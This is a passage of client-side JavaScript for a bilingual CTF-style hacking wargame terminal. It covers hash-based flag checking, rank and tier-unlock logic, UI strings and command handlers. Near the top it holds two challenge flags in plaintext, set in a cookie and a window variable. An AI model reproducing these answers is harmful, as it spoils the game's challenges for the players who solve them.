/* Vibe Hacking // Infiltration Terminal — client-side only.
   Reuses CHALLENGES / TIERS / TRACKS from challenges.js (untouched).
   Flags are verified by SHA-256 only; no plaintext answers live here. */
(function () {
  "use strict";

  /* ===== planted in-page flags (some challenges hunt for these) ===== */
  document.cookie = "wg_flag=FLAG{cookie_monster_2026}; path=/; SameSite=Lax"; // t1_cookie
  window.__hint = "FLAG{devtools_console_hero}"; // t0_devtools
  try {
    console.log("%c[vibe] 콘솔까지 열다니, 될성부른 떡잎. / You opened the console — promising.",
      "color:#27ff8b;font-weight:700");
    console.log("%cwindow.__hint = " + window.__hint, "color:#ffcf4d");
  } catch (e) {}

  /* ===== compact SHA-256 (fallback for non-secure / file:// contexts) ===== */
  async function sha256(msg) {
    if (window.crypto && window.crypto.subtle) {
      try {
        const buf = await crypto.subtle.digest("SHA-256", new TextEncoder().encode(msg));
        return Array.from(new Uint8Array(buf)).map(b => b.toString(16).padStart(2, "0")).join("");
      } catch (e) { /* fall through */ }
    }
    return sha256js(msg);
  }
  function sha256js(ascii) {
    function rr(n, x) { return (x >>> n) | (x << (32 - n)); }
    const K = [
      0x428a2f98,0x71374491,0xb5c0fbcf,0xe9b5dba5,0x3956c25b,0x59f111f1,0x923f82a4,0xab1c5ed5,
      0xd807aa98,0x12835b01,0x243185be,0x550c7dc3,0x72be5d74,0x80deb1fe,0x9bdc06a7,0xc19bf174,
      0xe49b69c1,0xefbe4786,0x0fc19dc6,0x240ca1cc,0x2de92c6f,0x4a7484aa,0x5cb0a9dc,0x76f988da,
      0x983e5152,0xa831c66d,0xb00327c8,0xbf597fc7,0xc6e00bf3,0xd5a79147,0x06ca6351,0x14292967,
      0x27b70a85,0x2e1b2138,0x4d2c6dfc,0x53380d13,0x650a7354,0x766a0abb,0x81c2c92e,0x92722c85,
      0xa2bfe8a1,0xa81a664b,0xc24b8b70,0xc76c51a3,0xd192e819,0xd6990624,0xf40e3585,0x106aa070,
      0x19a4c116,0x1e376c08,0x2748774c,0x34b0bcb5,0x391c0cb3,0x4ed8aa4a,0x5b9cca4f,0x682e6ff3,
      0x748f82ee,0x78a5636f,0x84c87814,0x8cc70208,0x90befffa,0xa4506ceb,0xbef9a3f7,0xc67178f2
    ];
    const H = [0x6a09e667,0xbb67ae85,0x3c6ef372,0xa54ff53a,0x510e527f,0x9b05688c,0x1f83d9ab,0x5be0cd19];
    let i = 0;
    const bytes = []; const utf8 = unescape(encodeURIComponent(ascii));
    for (i = 0; i < utf8.length; i++) bytes.push(utf8.charCodeAt(i));
    const bitLen = bytes.length * 8; bytes.push(0x80);
    while (bytes.length % 64 !== 56) bytes.push(0);
    for (let s = 56; s >= 0; s -= 8) bytes.push((Math.floor(bitLen / Math.pow(2, s))) & 0xff);
    const w = new Int32Array(64);
    for (let j = 0; j < bytes.length; j += 64) {
      for (i = 0; i < 16; i++) w[i] = (bytes[j+i*4]<<24)|(bytes[j+i*4+1]<<16)|(bytes[j+i*4+2]<<8)|(bytes[j+i*4+3]);
      for (i = 16; i < 64; i++) {
        const s0 = rr(7,w[i-15]) ^ rr(18,w[i-15]) ^ (w[i-15]>>>3);
        const s1 = rr(17,w[i-2]) ^ rr(19,w[i-2]) ^ (w[i-2]>>>10);
        w[i] = (w[i-16] + s0 + w[i-7] + s1) | 0;
      }
      let a=H[0],b=H[1],c=H[2],d=H[3],e=H[4],f=H[5],g=H[6],h=H[7];
      for (i = 0; i < 64; i++) {
        const S1 = rr(6,e)^rr(11,e)^rr(25,e); const ch = (e&f)^(~e&g);
        const t1 = (h + S1 + ch + K[i] + w[i]) | 0;
        const S0 = rr(2,a)^rr(13,a)^rr(22,a); const maj = (a&b)^(a&c)^(b&c);
        const t2 = (S0 + maj) | 0;
        h=g; g=f; f=e; e=(d+t1)|0; d=c; c=b; b=a; a=(t1+t2)|0;
      }
      H[0]=(H[0]+a)|0; H[1]=(H[1]+b)|0; H[2]=(H[2]+c)|0; H[3]=(H[3]+d)|0;
      H[4]=(H[4]+e)|0; H[5]=(H[5]+f)|0; H[6]=(H[6]+g)|0; H[7]=(H[7]+h)|0;
    }
    return H.map(x => (x >>> 0).toString(16).padStart(8, "0")).join("");
  }

  /* ===== layer theming (maps each tier -> an infiltration node) ===== */
  const LAYERS = [
    { tier:0, id:"perimeter", ko:"외곽 경계",   en:"Perimeter" },
    { tier:1, id:"webserver", ko:"웹 서버",     en:"Web Server" },
    { tier:2, id:"internal",  ko:"내부망",       en:"Internal Net" },
    { tier:3, id:"vault",     ko:"금고",         en:"The Vault" },
    { tier:4, id:"core",      ko:"코어 / 크라운주얼", en:"Core / Crown Jewels" }
  ];
  const layerByTier = t => LAYERS.find(l => l.tier === t);
  const layerById   = id => LAYERS.find(l => l.id === id);

  /* ===== ranks / scoring ===== */
  // Earned ranks are fractions of the pool, not fixed solve counts: a fixed
  // count decays as the pool grows — "70 solves = Legend" was 93% back when the
  // pool was 75 but only a third of 210. Hacker and Elite are the 75-era ratios
  // (32/52 of 75) rounded. Egg/Newbie stay absolute: "have you started at all"
  // is not a share of anything.
  // Apprentice and Legend are deliberately off that curve, at both ends. Both
  // were picked against the pool as it stood then — 245 challenges — and the
  // solve counts below are that snapshot, kept because they are what the
  // reasoning was about. Only the ratios ship, so the counts move on their own.
  // Apprentice's 75-era ratio, 0.20, landed at 49 of that 245 — past the tier-0
  // breach at 31, so the whole opening stretch ran without a single
  // progression event. The 50-challenge game handed you two inside ten solves
  // (a layer at 4, Apprentice at 10). 0.12 put it at 30, just ahead of the
  // first unlock, which is the order that game had.
  // Legend's 0.93 was faithful to 75 and scaled on without decaying, but
  // faithful is not the same as wanted: at 228 of that 245 it left only 17
  // solves you could ever miss, reached by a 58-solve run from Elite with
  // nothing in between. 0.85 put it at 209 — 36 missable, 39 since Elite — and
  // still means "nearly cleared it". The guard floor is 0.80, so this
  // deliberately spends most of the room above it.
  const RANKS = [
    { min:0,   icon:"🥚", ko:"알",     en:"Egg" },
    { min:1,   icon:"🐣", ko:"뉴비",   en:"Newbie" },
    { at:0.12, icon:"🦊", ko:"수습",   en:"Apprentice" },
    { at:0.43, icon:"🐺", ko:"해커",   en:"Hacker" },
    { at:0.69, icon:"🦅", ko:"엘리트", en:"Elite" },
    { at:0.85, icon:"👑", ko:"레전드", en:"Legend" }
  ];
  const rankMin = r => r.min != null ? r.min : Math.ceil(r.at * CHALLENGES.length);
  const rankOf  = n => RANKS.slice().reverse().find(r => n >= rankMin(r));
  const HINT_PENALTY = 0.2, MIN_AWARD = 0.2;

  /* ===== i18n ===== */
  const STR = {
    ko: {
      bootDone:"부팅 완료. 침투 콘솔에 오신 것을 환영합니다.",
      welcome:"명령을 모르면 `help`, 첫 계층 침투는 `connect perimeter`.",
      langName:"EN", unknown:"알 수 없는 명령:",
      tryHelp:"`help` 로 사용 가능한 명령을 확인하세요.",
      nodesHdr:"=== 네트워크 계층 (침투 노드) ===",
      breached:"침투됨", locked:"잠김", open:"열림",
      needMore:"개 더 풀면 다음 계층이 열립니다.",
      connFirst:"먼저 `connect <노드>` 로 계층에 접속하세요.",
      noNode:"그런 노드가 없습니다:",
      nodeLocked:"접근 거부 — 이 계층은 아직 잠겨 있습니다.",
      connected:"접속됨:", locksHdr:"잠금장치(문제) 목록 — `cat <번호>` 로 열기:",
      pickLock:"`cat <번호>` 로 잠금장치를 여세요. (예: `cat 1`)",
      noLock:"그런 잠금장치가 없습니다:",
      targetSet:"표적 설정:", targetHow:"플래그를 입력하거나 `submit <플래그>` · 막히면 `hint`.",
      noTarget:"표적이 없습니다. `cat <번호>` 로 먼저 잠금장치를 여세요.",
      already:"이미 침투한 잠금장치입니다.",
      granted:"ACCESS GRANTED", denied:"ACCESS DENIED",
      grantedSub:"잠금 해제 +", deniedSub:"플래그 불일치. 다시 시도하세요.",
      breachNode:"계층 침투 성공 →", nextOpen:"다음 계층 개방:",
      hintNone:"남은 힌트가 없습니다.", hintCost:"힌트 공개 (점수 -",
      statusHdr:"=== 작전 상태 ===",
      score:"점수", rank:"등급", solved:"침투", clearAsk:"화면을 지웁니다.",
      resetAsk:"모든 진행도를 초기화할까요? 되돌릴 수 없습니다. (yes 입력)",
      resetDone:"진행도 초기화 완료. 다시 시작합니다.",
      finale:"전 계층 침투 완료 — 당신은 코어를 손에 넣었습니다.",
      finaleSub:"진정한 바이브 해커. 친구에게 이 터미널을 던져 보세요.",
      mapHdr:"=== 침투 경로 ===",
      soundOn:"사운드 ON", soundOff:"사운드 OFF",
      hintLabel:"힌트", lockLabel:"잠금장치", format:"형식",
      exportHdr:"=== 세이브 토큰 (진행도 백업) ===",
      exportTip:"이 토큰을 복사하여 다른 기기에서 `import <토큰>`으로 복원하세요.",
      exportDone:"진행도 JSON 백업 파일이 다운로드되었습니다.",
      badgesHdr:"=== 요원 업적 및 뱃지 ===",
      badgeUnlocked:"새 업적 달성!",
      importDone:"진행도가 성공적으로 복원되었습니다.",
      importErr:"유효하지 않은 세이브 토큰입니다.",
      importUsage:"사용법: import <토큰>",
      searchHdr:"=== 잠금장치 검색 결과 ===",
      searchEmpty:"일치하는 잠금장치가 없습니다:",
      searchUsage:"사용법: search <검색어>"
    },
    en: {
      bootDone:"Boot complete. Welcome to the infiltration console.",
      welcome:"Type `help` for commands, `connect perimeter` to breach the first layer.",
      langName:"한국어", unknown:"unknown command:",
      tryHelp:"Type `help` to list available commands.",
      nodesHdr:"=== NETWORK LAYERS (infiltration nodes) ===",
      breached:"BREACHED", locked:"LOCKED", open:"OPEN",
      needMore:" more to open the next layer.",
      connFirst:"Connect to a layer first: `connect <node>`.",
      noNode:"no such node:",
      nodeLocked:"ACCESS DENIED — this layer is still locked.",
      connected:"connected:", locksHdr:"locks (challenges) — open with `cat <n>`:",
      pickLock:"Open a lock with `cat <n>`. (e.g. `cat 1`)",
      noLock:"no such lock:",
      targetSet:"target set:", targetHow:"Type the flag, or `submit <flag>` · stuck? `hint`.",
      noTarget:"No target. Open a lock first: `cat <n>`.",
      already:"This lock is already breached.",
      granted:"ACCESS GRANTED", denied:"ACCESS DENIED",
      grantedSub:"lock opened +", deniedSub:"flag mismatch. Try again.",
      breachNode:"LAYER BREACHED →", nextOpen:"next layer unlocked:",
      hintNone:"No more hints.", hintCost:"hint revealed (score -",
      statusHdr:"=== OPERATION STATUS ===",
      score:"score", rank:"rank", solved:"breached", clearAsk:"screen cleared.",
      resetAsk:"Reset all progress? This cannot be undone. (type yes)",
      resetDone:"Progress reset. Starting over.",
      finale:"All layers breached — the core is yours.",
      finaleSub:"A true vibe hacker. Throw this terminal at a friend.",
      mapHdr:"=== INFILTRATION PATH ===",
      soundOn:"sound ON", soundOff:"sound OFF",
      hintLabel:"hint", lockLabel:"lock", format:"format",
      exportHdr:"=== SAVE TOKEN (progress backup) ===",
      exportTip:"Copy this token and restore on another device via `import <token>`.",
      exportDone:"Progress JSON backup file downloaded.",
      badgesHdr:"=== OPERATOR ACHIEVEMENTS & BADGES ===",
      badgeUnlocked:"Achievement Unlocked!",
      importDone:"Progress restored successfully.",
      importErr:"Invalid save token.",
      importUsage:"Usage: import <token>",
      searchHdr:"=== SEARCH RESULTS ===",
      searchEmpty:"No matching locks found for:",
      searchUsage:"Usage: search <query>"
    }
  };

  /* ===== state ===== */
  const LS = "vibe_wargame_v1";  // keep key so prior solvers retain progress
  let state = { solved:{}, hints:{}, badges:{}, lang:"ko", sound:true };
  try { const s = JSON.parse(localStorage.getItem(LS)); if (s) state = Object.assign(state, s); } catch (e) {}
  if (!state.badges || typeof state.badges !== "object") state.badges = {};
  if (typeof state.sound !== "boolean") state.sound = true;
  function save() { try { localStorage.setItem(LS, JSON.stringify(state)); } catch (e) {} }
  function S(k){ return STR[state.lang][k]; }
  const L = () => state.lang;

  // session-only context (not persisted)
  let cwd = null;          // current node id, or null at root
  let target = null;       // current challenge id
  let pendingReset = false; // awaiting "yes" confirmation

  /* ===== challenge helpers ===== */
  const tierChals = tid => CHALLENGES.filter(c => c.tier === tid);
  const tierSolved = tid => tierChals(tid).filter(c => state.solved[c.id]).length;
  // How much of a layer you must breach before the next one opens, as a share of
  // that layer's own pool. The `need` counts in challenges.js were calibrated for
  // a 50-challenge game (7b474ab: "Rebalance tier thresholds (T1 6/10, T2 9/15,
  // T3 7/12) ... for 50") and never moved through six expansions, so by the time
  // the pool reached 245 they gated a layer on roughly an eighth of it. These are those same 50-era ratios,
  // written as the fractions the commit message spelled them with; the count is
  // re-derived from whatever the pool holds now, so expansions carry it along.
  // Tier 0 is not in this table; it is the entrance, and it scales differently.
  const TIER_NEED_AT = { 1: 6/10, 2: 9/15, 3: 7/12, 4: 5/7 };
  const tierNeed = tid => {
    const pool = tierChals(tid).length;
    // The entrance is the one layer where a flat share is the wrong rule, and
    // fixing the decay above made that worse rather than better. Expansions add
    // tracks — breadth — so tier 0 collects a couple of warm-ups every time a
    // new subject arrives, and 4/6 of a pool that had grown to 55 asked for 37
    // solves before a second layer existed at all: 12% of the whole game spent
    // in the tutorial, where the 50-lock game it was calibrated on asked for 4.
    // Nobody needs the hardware warm-ups to be ready for the web tier above.
    // So the entrance keeps the same anchor (4 of 6) and grows sub-linearly out
    // of it — the bar still moves with the pool, it just stops racing it. At 55
    // that is 26, which is 8% of the game, about what 4 of 50 was.
    if (tid === TIERS[0].id) {
      const ENTRY_POOL = 6, ENTRY_NEED = 4, ENTRY_CURVE = 0.85;
      const n = ENTRY_NEED * Math.pow(pool / ENTRY_POOL, ENTRY_CURVE);
      return Math.min(pool, Math.max(Math.ceil(0.4 * pool), Math.round(n)));
    }
    const at = TIER_NEED_AT[tid];
    if (at == null) return (TIERS.find(x => x.id === tid) || {}).need || 0;
    return Math.min(pool, Math.max(1, Math.round(at * pool)));
  };
  const isTierUnlocked = tid => {
    if (tid === 0) return true;
    const prev = TIERS.find(x => x.id === tid - 1);
    return tierSolved(prev.id) >= tierNeed(prev.id);
  };
  const solvedCount = () => Object.keys(state.solved).length;
  const totalScore = () => Object.values(state.solved).reduce((a, b) => a + (b.earned || 0), 0);
  function awardFor(ch){
    const used = state.hints[ch.id] || 0;
    return Math.round(ch.points * Math.max(MIN_AWARD, 1 - used * HINT_PENALTY));
  }
  // locks in a node, numbered 1..n in array order
  function locksOf(nodeId){
    const layer = layerById(nodeId);
    if (!layer) return [];
    return tierChals(layer.tier);
  }

  /* ===== sound (WebAudio, generated) ===== */
  let actx = null;
  function audio(){
    if (!state.sound) return null;
    try { if (!actx) actx = new (window.AudioContext || window.webkitAudioContext)(); } catch(e){ return null; }
    if (actx && actx.state === "suspended") actx.resume();
    return actx;
  }
  function tone(freq, dur, type, gain, when){
    const c = audio(); if (!c) return;
    const t0 = c.currentTime + (when||0);
    const o = c.createOscillator(), g = c.createGain();
    o.type = type || "square"; o.frequency.value = freq;
    g.gain.setValueAtTime(0.0001, t0);
    g.gain.exponentialRampToValueAtTime(gain||0.06, t0+0.01);
    g.gain.exponentialRampToValueAtTime(0.0001, t0+dur);
    o.connect(g); g.connect(c.destination);
    o.start(t0); o.stop(t0+dur+0.02);
  }
  const sKey     = () => tone(420+Math.random()*120, 0.03, "square", 0.025);
  const sEnter   = () => tone(280, 0.05, "square", 0.04);
  function sGrant(){ [523,659,784,1046].forEach((f,i)=>tone(f,0.16,"triangle",0.07,i*0.07)); }
  function sDeny(){ tone(150,0.16,"sawtooth",0.07); tone(120,0.22,"sawtooth",0.06,0.06); }
  function sBreach(){ [392,523,659,784,1046,1318].forEach((f,i)=>tone(f,0.22,"triangle",0.08,i*0.06)); }

  /* ===== output ===== */
  const out = document.getElementById("out");
  function scrollEnd(){ out.scrollTop = out.scrollHeight; }
  function esc(s){ return String(s).replace(/[&<>"]/g, c => ({ "&":"&amp;","<":"&lt;",">":"&gt;","\"":"&quot;" }[c])); }
  function fmtInline(s){ // escape, then `code` spans
    return esc(s).replace(/`([^`]+)`/g, '<code>$1</code>');
  }
  function print(html, cls){
    const d = document.createElement("div");
    d.className = "line" + (cls ? " " + cls : "");
    d.innerHTML = html;
    out.appendChild(d); scrollEnd();
    return d;
  }
  function printText(s, cls){ return print(fmtInline(s), cls); }
  function blank(){ print("&nbsp;"); }

  function echoCmd(raw){
    print('<span class="echo"><span class="p">' + esc(ps1text()) + '</span> ' + esc(raw) + '</span>');
  }

  /* boot + banner sequences print line-by-line with small delays */
  function printSeq(lines, done){
    let i = 0;
    (function step(){
      if (i >= lines.length){ if (done) done(); return; }
      const ln = lines[i++];
      print(ln.html, ln.cls);
      setTimeout(step, ln.d != null ? ln.d : 90);
    })();
  }

  /* ===== prompt / HUD ===== */
  function ps1text(){
    if (cwd){
      const lay = layerById(cwd);
      const here = "/" + cwd + (target ? "/" + target : "");
      return "root@" + (lay ? "vibe" : "vibe") + ":" + here + "$";
    }
    return "root@vibe:~$";
  }
  function refreshHud(){
    const n = solvedCount(), tot = CHALLENGES.length;
    document.getElementById("hudScore").textContent = totalScore();
    document.getElementById("hudSolved").textContent = n + "/" + tot;
    const rank = rankOf(n);
    const rk = document.getElementById("hudRank");
    rk.textContent = rank.icon; rk.title = rank[L()];
    document.getElementById("hudBar").style.width = (n / tot * 100) + "%";
    document.getElementById("ps1").textContent = ps1text();
    document.getElementById("soundBtn").textContent = state.sound ? "🔊" : "🔇";
    document.getElementById("langBtn").textContent = S("langName");
  }

  /* ===== command renderers ===== */
  function showHelp(){
    const rows = [
      ["help","명령 목록 / list commands"],
      ["ls [필터]","현재 위치 목록 (트랙·unsolved 필터 가능) / list here"],
      ["tracks", TRACKS.length + "개 전체 트랙 현황 / list all " + TRACKS.length + " tracks"],
      ["map","침투 경로 지도 / infiltration map"],
      ["connect <노드>","계층에 접속 / connect to a layer  (cd <node>)"],
      ["back","상위로 / go up  (cd ..)"],
      ["cat <번호|id>","잠금장치(문제) 열기 / open a lock  (open <n|id>)"],
      ["hint","현재 표적 힌트 공개 / reveal a hint"],
      ["submit <flag>","플래그 제출 / submit a flag  (또는 그냥 입력)"],
      ["status","점수·등급·진행 / score & progress  (whoami)"],
      ["stats","트랙별·계층별 침투 통계 / stats dashboard  (chart)"],
      ["badges","요원 업적 및 뱃지 확인 / view operator badges"],
      ["playground [도구]","보안 취약점 시뮬레이터 / vulnerability playground (sim)"],
      ["search <검색어>","잠금장치 검색 / search locks  (find)"],
      ["export [json]","진행도 백업 토큰/JSON 내보내기 / export save token or JSON"],
      ["import [토큰]","진행도 토큰/파일 복원 / import save token or file"],
      ["lang","한/영 전환 / toggle language"],
      ["sound","사운드 토글 / toggle sound"],
      ["clear","화면 지우기 / clear screen"],
      ["reset","진행도 초기화 / reset progress"]
    ];
    blank();
    print('<span class="bold">' + (L()==="ko"?"사용 가능한 명령":"AVAILABLE COMMANDS") + '</span>');
    rows.forEach(r => print('<span class="tbl"><span class="cmd-h">' + r[0].padEnd(18," ").replace(/ /g,"&nbsp;") +
      '</span> <span class="dim">' + esc(r[1]) + '</span></span>'));
    blank();
    print('<span class="dim">' + esc(S("welcome")) + '</span>');
  }

  function showNodes(){
    blank();
    print('<span class="bold">' + esc(S("nodesHdr")) + '</span>');
    LAYERS.forEach(lay => {
      const tier = TIERS.find(t => t.id === lay.tier);
      const sc = tierSolved(lay.tier), tc = tierChals(lay.tier).length;
      const need = tierNeed(lay.tier);
      const unlocked = isTierUnlocked(lay.tier);
      const breached = sc >= need;
      const statusHtml = !unlocked
        ? '<span class="dim">🔒 ' + esc(S("locked")) + '</span>'
        : (breached
          ? '<span class="ok">✓ ' + esc(S("breached")) + '</span>'
          : '<span class="warn">▸ ' + esc(S("open")) + ' (' + (need - sc) + esc(S("needMore")) + ')</span>');
      const name = lay[L()] + " · " + esc(tier["desc_" + L()]);
      print('<span class="tbl"><span class="row' + (unlocked ? "" : " locked-row") + '">' +
        '<span class="id">[' + esc(lay.id) + ']</span>' +
        '<span class="kw">TIER ' + lay.tier + '</span>' +
        '<span>' + esc(name) + '</span>' +
        '<span class="dim">' + sc + '/' + tc + ' · ' + (L()==="ko"?"통과":"need") + ' ' + tierNeed(lay.tier) + '</span>' +
        statusHtml + '</span></span>');
    });
    blank();
    print('<span class="dim">' + esc(S("pickLock")==null?"":"") + (L()==="ko"
      ? "`connect &lt;노드&gt;` 로 계층에 침투하세요." : "Breach a layer with `connect &lt;node&gt;`.") + '</span>');
  }

  function showLocks(nodeId, filterArg){
    const lay = layerById(nodeId);
    if (!lay) return;
    const tier = TIERS.find(t => t.id === lay.tier);
    let chals = locksOf(nodeId);
    let filterDesc = "";
    if (filterArg && filterArg.trim()){
      const q = filterArg.trim().toLowerCase();
      if (q === "unsolved" || q === "todo" || q === "미해결"){
        chals = chals.filter(c => !state.solved[c.id]);
        filterDesc = " (" + (L()==="ko" ? "미해결" : "unsolved") + ")";
      } else if (q === "solved" || q === "done" || q === "해결"){
        chals = chals.filter(c => !!state.solved[c.id]);
        filterDesc = " (" + (L()==="ko" ? "해결됨" : "solved") + ")";
      } else {
        chals = chals.filter(c => (c.track && c.track.toLowerCase().includes(q)) || (c.cat && c.cat.toLowerCase().includes(q)));
        filterDesc = " [" + q + "]";
      }
    }
    blank();
    print('<span class="bold">' + esc(S("connected")) + ' [' + esc(nodeId) + '] ' + esc(lay[L()]) + esc(filterDesc) + ' (' + chals.length + ')</span>');
    print('<span class="dim">' + esc(tier["desc_" + L()]) + '</span>');
    print('<span class="dim">' + esc(S("locksHdr")) + '</span>');
    chals.forEach((c, i) => {
      const solved = !!state.solved[c.id];
      const num = String(i + 1).padStart(2, "0");
      const mark = solved ? '<span class="ok">[✓]</span>' : '<span class="warn">[ ]</span>';
      const cls = solved ? "solved-row" : "";
      print('<span class="tbl"><span class="row ' + cls + '">' +
        mark + ' <span class="id">' + num + '</span>' +
        '<span class="dim" style="width:110px;display:inline-block;">' + esc(c.id) + '</span>' +
        '<span class="ct">' + esc(c.cat) + '</span>' +
        '<span>' + esc(c.title[L()]) + '</span>' +
        '<span class="dim">' + c.points + 'pt</span>' +
        (solved ? '<span class="ok">+' + state.solved[c.id].earned + '</span>' : '') +
        '</span></span>');
    });
    blank();
    const need = tierNeed(lay.tier), have = tierSolved(lay.tier);
    if (have < need){
      print('<span class="warn">' + (L()==="ko"
        ? ("이 계층 침투까지 " + (need - have) + "개 남음.")
        : ((need - have) + " more lock(s) to breach this layer.")) + '</span>');
    }
    print('<span class="dim">' + esc(S("pickLock")) + '</span>');
  }

  function catLock(arg){
    let ch = null;
    let chals = cwd ? locksOf(cwd) : [];
    if (cwd && /^\d+$/.test(arg)){ ch = chals[parseInt(arg,10) - 1]; }
    if (!ch && cwd) ch = chals.find(c => c.id === arg);
    // UI 2.0: global lookup by challenge id if not found in current layer
    if (!ch && arg){
      const direct = CHALLENGES.find(c => c.id.toLowerCase() === (arg || "").trim().toLowerCase());
      if (direct){
        if (!isTierUnlocked(direct.tier)){
          printText(S("nodeLocked"), "err");
          sDeny();
          return;
        }
        const targetLay = layerByTier(direct.tier);
        if (targetLay){
          cwd = targetLay.id;
          chals = locksOf(cwd);
          ch = direct;
          refreshHud();
        }
      }
    }
    if (!cwd && !ch){ printText(S("connFirst"), "warn"); return; }
    if (!ch){ printText(S("noLock") + " " + arg, "err"); sDeny(); return; }
    target = ch.id;
    const solved = !!state.solved[ch.id];
    const box = document.createElement("div");
    box.className = "cbox" + (solved ? " solved" : "");
    const idx = chals.indexOf(ch) + 1;
    box.innerHTML =
      '<div class="cbh">' +
        '<span class="tag">' + esc(S("lockLabel")) + ' ' + (idx > 0 ? String(idx).padStart(2,"0") : esc(ch.id)) + '</span>' +
        '<span class="ct">' + esc(ch.cat) + (ch.track ? ' · ' + esc(ch.track) : '') + '</span>' +
        (solved ? '<span class="ok">✓ ' + esc(S("breached")) + '</span>' : '') +
        '<span class="pt">' + ch.points + 'pt</span>' +
      '</div>' +
      '<div class="cbody">' + fmtInline(ch.prompt[L()]) + '</div>' +
      (ch.fmt ? '<div class="cfmt">' + esc(S("format")) + ': <b>' + esc(ch.fmt) + '</b></div>' : '');
    out.appendChild(box); scrollEnd();
    // hints already revealed
    const used = state.hints[ch.id] || 0;
    for (let i = 0; i < used && i < ch.hints[L()].length; i++){
      print('<span class="warn">💡 ' + esc(ch.hints[L()][i]) + '</span>');
    }
    if (!solved){
      print('<span class="targetline">▶ ' + esc(S("targetSet")) + ' ' + esc(ch.title[L()]) + '</span>');
      print('<span class="dim">' + esc(S("targetHow")) + '</span>');
    }
    refreshHud();
  }

  function doHint(arg){
    let id = target;
    if (arg && /^\d+$/.test(arg) && cwd){ const c = locksOf(cwd)[parseInt(arg,10)-1]; if (c) id = c.id; }
    if (!id){ printText(S("noTarget"), "warn"); return; }
    const ch = CHALLENGES.find(c => c.id === id);
    const used = state.hints[ch.id] || 0;
    if (used >= ch.hints[L()].length){ printText(S("hintNone"), "dim"); return; }
    state.hints[ch.id] = used + 1; save();
    print('<span class="warn">💡 ' + esc(ch.hints[L()][used]) + '</span>');
    print('<span class="dim">(' + esc(S("hintCost")) + Math.round(HINT_PENALTY*100) + '%)</span>');
    refreshHud();
  }

  async function trySubmit(flag){
    if (!target){ printText(S("noTarget"), "warn"); return; }
    const ch = CHALLENGES.find(c => c.id === target);
    if (state.solved[ch.id]){ printText(S("already"), "dim"); return; }
    const norm = ch.ci ? flag.trim().toLowerCase() : flag.trim();
    if (!norm) return;
    const h = await sha256(norm);
    if (h !== ch.hash){
      sDeny();
      printSeq([
        { html:'<span class="banner deny">  ╳  ' + esc(S("denied")) + '  ╳  </span>', cls:"", d:60 },
        { html:'<span class="err">' + esc(S("deniedSub")) + '</span>', d:0 }
      ]);
      return;
    }
    // correct
    const earned = awardFor(ch);
    state.solved[ch.id] = { earned: earned, ts: Date.now() };
    save();
    checkAchievements(false);
    const lay = layerById(cwd), tier = TIERS.find(t => t.id === lay.tier);
    const beforeUnlockedNext = isTierUnlocked(tier.id + 1);
    sGrant();
    refreshHud();
    printSeq([
      { html:'<span class="banner grant"> ▓▓ ' + esc(S("granted")) + ' ▓▓ </span>', d:120 },
      { html:'<span class="ok">' + esc(S("grantedSub")) + earned + '  (' + esc(ch.title[L()]) + ')</span>', d:60 }
    ], () => {
      // node breach?
      const nowUnlockedNext = isTierUnlocked(tier.id + 1);
      const justBreached = !beforeUnlockedNext && nowUnlockedNext;
      const nextLayer = layerByTier(tier.id + 1);
      if (justBreached && nextLayer){
        sBreach();
        printSeq([
          { html:'&nbsp;', d:120 },
          { html:'<span class="banner breach">┏━━ ' + esc(S("breachNode")) + ' ' + esc(lay[L()]) + ' ━━┓</span>', d:160 },
          { html:'<span class="warn">' + esc(S("nextOpen")) + ' [' + esc(nextLayer.id) + '] ' + esc(nextLayer[L()]) +
                 ' — `connect ' + esc(nextLayer.id) + '`</span>', d:0 }
        ]);
      }
      // full completion?
      if (solvedCount() === CHALLENGES.length) finale();
    });
    target = null; // require reopening for next lock
  }

  function finale(){
    sBreach();
    const art = [
      "  ██████  ██████  ██████  ███████ ",
      " ██      ██    ██ ██   ██ ██      ",
      " ██      ██    ██ ██████  █████   ",
      " ██      ██    ██ ██   ██ ██      ",
      "  ██████  ██████  ██   ██ ███████ "
    ];
    blank();
    art.forEach(a => print('<span class="banner breach">' + a.replace(/ /g,"&nbsp;") + '</span>'));
    print('<span class="ok bold">★ ' + esc(S("finale")) + '</span>');
    print('<span class="dim">' + esc(S("finaleSub")) + '</span>');
  }

  function showStatus(){
    const n = solvedCount(), tot = CHALLENGES.length;
    const rank = rankOf(n);
    blank();
    print('<span class="bold">' + esc(S("statusHdr")) + '</span>');
    print('<span class="tbl"><span class="dim">' + esc(S("score")) + ':</span> <span class="ok">' + totalScore() + '</span></span>');
    print('<span class="tbl"><span class="dim">' + esc(S("rank")) + ':</span> ' + rank.icon + ' <span class="kw">' + esc(rank[L()]) + '</span></span>');
    print('<span class="tbl"><span class="dim">' + esc(S("solved")) + ':</span> ' + n + '/' + tot + '</span>');
    blank();
    LAYERS.forEach(lay => {
      const tier = TIERS.find(t => t.id === lay.tier);
      const sc = tierSolved(lay.tier), tc = tierChals(lay.tier).length;
      const unlocked = isTierUnlocked(lay.tier);
      const bar = barStr(sc, tc);
      const tag = !unlocked ? '🔒' : (sc >= tierNeed(lay.tier) ? '<span class="ok">✓</span>' : '<span class="warn">▸</span>');
      print('<span class="tbl"><span class="row"><span class="id">[' + esc(lay.id) + ']</span>' +
        tag + ' <span class="dim">' + bar + ' ' + sc + '/' + tc + '</span></span></span>');
    });
  }
  function barStr(a, b){
    const w = 14, f = b ? Math.round(a / b * w) : 0;
    return '<span class="ok">' + "█".repeat(f) + '</span><span class="dim">' + "░".repeat(w - f) + '</span>';
  }

  function showStats(){
    const n = solvedCount(), tot = CHALLENGES.length;
    const rank = rankOf(n);
    const pct = tot ? Math.round((n / tot) * 100) : 0;
    blank();
    print('<span class="bold">📊 ' + (L()==="ko" ? "침투 통계 대시보드" : "INFILTRATION STATS DASHBOARD") + '</span>');
    print('<span class="tbl"><span class="dim">' + (L()==="ko" ? "전체 진행률" : "Overall Progress") + ':</span> ' +
      barStr(n, tot) + ' <span class="ok bold">' + n + '/' + tot + ' (' + pct + '%)</span></span>');
    print('<span class="tbl"><span class="dim">' + esc(S("score")) + ':</span> <span class="ok">' + totalScore() + '</span>' +
      '  <span class="dim">' + esc(S("rank")) + ':</span> ' + rank.icon + ' <span class="kw">' + esc(rank[L()]) + '</span></span>');
    blank();
    print('<span class="bold">' + (L()==="ko" ? ("트랙별 진행 현황 (" + TRACKS.length + " Tracks)") : ("Progress by Track (" + TRACKS.length + " Tracks)")) + '</span>');

    TRACKS.forEach(tr => {
      const chals = CHALLENGES.filter(c => c.track === tr.id);
      const sc = chals.filter(c => state.solved[c.id]).length;
      const tc = chals.length;
